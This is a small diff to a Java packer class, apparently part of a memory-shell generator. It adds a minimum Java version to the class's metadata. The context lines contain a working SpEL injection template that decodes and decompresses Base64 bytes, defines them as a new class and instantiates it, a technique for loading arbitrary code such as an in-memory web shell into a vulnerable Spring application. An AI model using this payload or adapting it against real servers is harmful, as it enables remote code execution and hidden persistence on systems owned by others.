@@ -5,7 +5,7 @@ import org.leo.jmg.mem.packer.Packer;
 import org.leo.jmg.mem.packer.PackerMeta;
 import org.leo.jmg.mem.packer.PackerRegistry;
 
-@PackerMeta(name = "SpELSpringGzipJDK17", group = "SpEL", order = 3)
+@PackerMeta(name = "SpELSpringGzipJDK17", group = "SpEL", order = 3, minTargetJava = 17)
 public class SpELSpringGzipJDK17Packer implements Packer {
     String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.springframework.util.StreamUtils).copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser')).newInstance()";
 
